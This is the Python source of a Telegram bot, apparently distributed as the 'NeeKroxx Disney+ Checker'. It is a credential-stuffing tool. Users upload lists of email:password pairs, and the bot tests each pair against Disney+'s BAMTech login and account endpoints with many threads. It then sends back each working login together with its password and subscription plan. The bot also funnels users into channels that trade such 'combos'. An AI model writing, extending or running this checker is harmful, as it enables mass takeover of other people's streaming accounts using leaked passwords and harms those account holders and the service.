import asyncio
import logging
import os
import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InputMediaPhoto
)
from aiogram.enums import ParseMode
from dotenv import load_dotenv

# Cargar variables de entorno
load_dotenv()

# ==========================================
# CONFIGURACIÓN
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "TU_TOKEN_AQUI")
OWNER_USERNAME = "@neekroxx"
WEBSITE_URL = "neekroxx.store"

REQUIRED_CHANNELS = [
    "@neekroxx_mains",
    "@neekroxx_tools",
    "@neekroxx_vouches",
    "@neekroxx_combos"
]

# Disney+ BAMTech API
DISNEY_CLIENT_ID = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
DISNEY_TOKEN_URL = "https://global.edge.bamtech.com/token"
DISNEY_ACCOUNT_URL = "https://global.edge.bamtech.com/accounts/me"

# Imágenes (Reemplaza con tus URLs reales)
WELCOME_IMAGE = "https://i.imgur.com/placeholder_welcome.jpg"
CHECKING_IMAGE = "https://i.imgur.com/placeholder_checking.jpg"

# ==========================================
# INICIALIZACIÓN
# ==========================================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

# Almacenamiento en memoria
user_data = {}

# ==========================================
# ESTADOS FSM
# ==========================================
class CheckerStates(StatesGroup):
    waiting_verification = State()
    main_menu = State()
    step1_combo = State()
    step2_settings = State()
    step3_proxies = State()
    step4_running = State()

# ==========================================
# SERVICIOS (Lógica de negocio)
# ==========================================
def parse_combos(text: str) -> list:
    return [line.strip() for line in text.strip().split("\n") if ":" in line.strip()]

async def check_disney(session: aiohttp.ClientSession, email: str, password: str, proxy: str = None) -> dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Bearer {DISNEY_CLIENT_ID}"
    }
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
        "latitude": "0",
        "longitude": "0",
        "platform": "browser",
        "subject_token": password,
        "subject_token_type": "urn:bamtech:params:oauth:token-type:password",
        "token_type": "urn:ietf:params:oauth:token-type:id_token",
        "device_family": "browser",
        "application-runtime": "chrome"
    }
    
    try:
        async with session.post(DISNEY_TOKEN_URL, data=payload, headers=headers, proxy=proxy, timeout=10) as resp:
            data = await resp.json()
            if data.get("access_token"):
                headers2 = {"Authorization": f"Bearer {data['access_token']}"}
                async with session.get(DISNEY_ACCOUNT_URL, headers=headers2, proxy=proxy) as resp2:
                    account = await resp2.json()
                    subscriptions = account.get("data", {}).get("subscriptions", [])
                    is_active = any(sub.get("status") == "active" for sub in subscriptions)
                    
                    return {
                        "status": "HIT",
                        "active": is_active,
                        "email": email,
                        "password": password,
                        "subscription": subscriptions[0].get("plan", {}).get("name", "Unknown") if subscriptions else "None"
                    }
            return {"status": "BAD", "email": email}
    except Exception:
        return {"status": "RETRY", "email": email}

async def run_checker_batch(bot_ref, user_id: int, combos: list, threads: int = 10):
    data = user_data.get(user_id, {})
    hits = []
    bad = 0
    semaphore = asyncio.Semaphore(threads)
    
    async with aiohttp.ClientSession() as session:
        async def process_one(combo):
            nonlocal bad
            async with semaphore:
                email, password = combo.split(":", 1)
                result = await check_disney(session, email, password)
                
                if result["status"] == "HIT":
                    hits.append(result)
                    await bot_ref.send_message(
                        user_id,
                        f"✅ <b>HIT DETECTADO</b>\n <code>{result['email']}</code>\n🔑 <code>{result['password']}</code>\n⭐ Activa: {result['active']}\n📦 Plan: {result['subscription']}"
                    )
                elif result["status"] == "BAD":
                    bad += 1
                return result
        
        tasks = [process_one(c) for c in combos]
        await asyncio.gather(*tasks)
    
    data["hits"] = hits
    data["bad"] = bad
    
    await bot_ref.send_message(
        user_id,
        f"🏁 <b>Chequeo Finalizado</b>\n\n"
        f"📊 Total: {len(combos)}\n"
        f"✅ Hits: {len(hits)}\n"
        f"❌ Bad: {bad}"
    )

# ==========================================
# HANDLERS
# ==========================================
async def check_membership(user_id: int) -> bool:
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception:
            return False
    return True

async def show_main_menu(message, user_id: int, state: FSMContext):
    await state.set_state(CheckerStates.main_menu)
    user_data[user_id] = {"threads": 10, "retries": 2, "combos": [], "hits": [], "bad": 0}
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Start Checking", callback_data="start_checking")],
        [InlineKeyboardButton(text="⚙️ Settings", callback_data="settings"),
         InlineKeyboardButton(text="📋 Past Results", callback_data="past_results")],
        [InlineKeyboardButton(text=" Live Status", callback_data="live_status"),
         InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
        [InlineKeyboardButton(text="📘 Help & Guide", callback_data="help_guide")],
        [InlineKeyboardButton(text="🌐 Visit Website", url=f"https://{WEBSITE_URL}"),
         InlineKeyboardButton(text="👤 Contact Owner", url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}")]
    ])
    
    caption = (
        f" <b>NeeKroxx Disney+ Checker</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 Welcome back! Choose an action below.\n\n"
        f"🚀 <b>Start Checking</b> — launch wizard\n"
        f"️ <b>Settings</b> — defaults & proxies\n"
        f"📋 <b>Past Results</b> — previous hits\n"
        f"📊 <b>Live Status</b> — real-time progress\n"
        f"👤 <b>Profile</b> — your hit stats\n"
        f" <b>Help</b> — usage guide\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 Website: <code>{WEBSITE_URL}</code>\n"
        f"👤 Owner: <code>{OWNER_USERNAME}</code>"
    )
    
    try:
        await message.edit_media(
            media=InputMediaPhoto(media=WELCOME_IMAGE, caption=caption),
            reply_markup=keyboard
        )
    except Exception:
        await message.answer_photo(photo=WELCOME_IMAGE, caption=caption, reply_markup=keyboard)

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.set_state(CheckerStates.waiting_verification)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🏠 Join NeeKroxx Mains", url="https://t.me/neekroxx_mains")],
        [InlineKeyboardButton(text="🛠️ Join NeeKroxx Tools", url="https://t.me/neekroxx_tools")],
        [InlineKeyboardButton(text="⭐ Join NeeKroxx Vouches", url="https://t.me/neekroxx_vouches")],
        [InlineKeyboardButton(text=" Join NeeKroxx Combos", url="https://t.me/neekroxx_combos")],
        [InlineKeyboardButton(text="✅ I've Joined — Verify", callback_data="verify_channels")]
    ])
    
    await message.answer_photo(
        photo=WELCOME_IMAGE,
        caption=(
            " <b>NeeKroxx Disney+ Checker</b>\n"
            "🚫 <b>Channel Verification Required</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            " Welcome! Join all channels to unlock the bot.\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Website: <code>{WEBSITE_URL}</code>\n"
            f"👤 Owner: <code>{OWNER_USERNAME}</code>"
        ),
        reply_markup=keyboard
    )

@router.callback_query(F.data == "verify_channels")
async def cb_verify(callback: CallbackQuery, state: FSMContext):
    is_member = await check_membership(callback.from_user.id)
    if not is_member:
        await callback.answer("❌ You must join all channels first!", show_alert=True)
        return
    await show_main_menu(callback.message, callback.from_user.id, state)
    await callback.answer()

@router.callback_query(F.data == "start_checking")
async def cb_start_checking(callback: CallbackQuery, state: FSMContext):
    await state.set_state(CheckerStates.step1_combo)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Upload File", callback_data="upload_file"),
         InlineKeyboardButton(text="📝 Paste Text", callback_data="paste_text")],
        [InlineKeyboardButton(text="⏮️ Back to Menu", callback_data="main_menu")]
    ])
    
    caption = (
        "🔥 <b>NeeKroxx Disney+ Checker</b>\n"
        "●○○○○ <b>Step 1/5</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        " <b>Combo List</b>\n\n"
        "Choose how to load your combo list:\n\n"
        "📤 <b>Upload File</b> — Send a .txt file\n"
        "📝 <b>Paste Text</b> — Type or paste combos\n\n"
        "🔖 Format: <code>email:password</code> (one per line)"
    )
    
    await callback.message.edit_media(
        media=InputMediaPhoto(media=CHECKING_IMAGE, caption=caption),
        reply_markup=keyboard
    )
    await callback.answer()

@router.callback_query(F.data == "upload_file")
async def cb_upload(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_caption(
        caption="📤 <b>Upload Combo File</b>\n\nSend your combo list as a <b>.txt</b> file.\nFormat: <code>email:password</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⏮️ Back", callback_data="start_checking")]])
    )
    await callback.answer()

@router.message(CheckerStates.step1_combo, F.document)
async def handle_file(message: Message, state: FSMContext):
    if not message.document.file_name.endswith(".txt"):
        await message.answer("❌ Only .txt files accepted."); return
    content = await message.document.download(as_bytes=True)
    combos = parse_combos(content.decode("utf-8", errors="ignore"))
    
    if not combos:
        await message.answer(" No valid combos found."); return
    
    user_data[message.from_user.id]["combos"] = combos
    await message.answer(f"✅ Loaded <b>{len(combos)}</b> combos. Ready to configure.")
    await state.set_state(CheckerStates.step2_settings)

@router.message(CheckerStates.step1_combo, ~F.document)
async def handle_text(message: Message, state: FSMContext):
    combos = parse_combos(message.text)
    if not combos:
        await message.answer("❌ No valid combos found. Format: email:password"); return
    
    user_data[message.from_user.id]["combos"] = combos
    await message.answer(f"✅ Loaded <b>{len(combos)}</b> combos. Ready to configure.")
    await state.set_state(CheckerStates.step2_settings)

@router.callback_query(F.data == "paste_text")
async def cb_paste(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_caption(
        caption="📝 <b>Paste Combos</b>\n\nSend your combos now, one per line:\n<code>email:password</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⏮️ Back", callback_data="start_checking")]])
    )
    await callback.answer()

@router.callback_query(F.data == "settings")
async def cb_settings(callback: CallbackQuery, state: FSMContext):
    data = user_data.get(callback.from_user.id, {"threads": 10})
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"⚡ Threads: {data.get('threads', 10)}", callback_data="set_threads")],
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="main_menu")]
    ])
    await callback.message.edit_caption(
        caption=f"⚙️ <b>Settings</b>\n\n Threads: <b>{data.get('threads', 10)}</b>",
        reply_markup=keyboard
    )
    await callback.answer()

@router.callback_query(F.data == "set_threads")
async def cb_set_threads(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_caption(caption="⚡ <b>Set Threads</b>\n\nSend a number (1-50):", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⏮️ Back", callback_data="settings")]]))
    await state.set_state(CheckerStates.step2_settings) # Reutilizamos estado para esperar input
    await callback.answer()

@router.message(CheckerStates.step2_settings)
async def handle_threads_input(message: Message, state: FSMContext):
    try:
        threads = int(message.text)
        if 1 <= threads <= 50:
            user_data[message.from_user.id]["threads"] = threads
            await message.answer(f"✅ Threads set to <b>{threads}</b>. Send /start to go to menu.")
            await state.clear()
        else:
            await message.answer("❌ Number must be between 1 and 50.")
    except ValueError:
        await message.answer("❌ Invalid number.")

@router.callback_query(F.data == "run_check")
async def cb_run(callback: CallbackQuery, state: FSMContext):
    data = user_data.get(callback.from_user.id)
    if not data or not data.get("combos"):
        await callback.answer("❌ No combos loaded.", show_alert=True); return
    
    await state.set_state(CheckerStates.step4_running)
    await callback.message.edit_caption(
        caption=f" <b>NeeKroxx Disney+ Checker</b>\n○○○○● <b>Step 5/5 — Running</b>\n\n⚡ Threads: {data['threads']}\n📊 Total: {len(data['combos'])}\n\nChecking in progress...",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📊 Live Status", callback_data="live_status")]])
    )
    await callback.answer()
    asyncio.create_task(run_checker_batch(bot, callback.from_user.id, data["combos"], data["threads"]))

@router.callback_query(F.data.in_(["main_menu", "back_menu"]))
async def cb_back(callback: CallbackQuery, state: FSMContext):
    await show_main_menu(callback.message, callback.from_user.id, state)
    await callback.answer()

# ==========================================
# MAIN
# ==========================================
async def main():
    logging.info("Starting NeeKroxx Disney+ Checker Bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())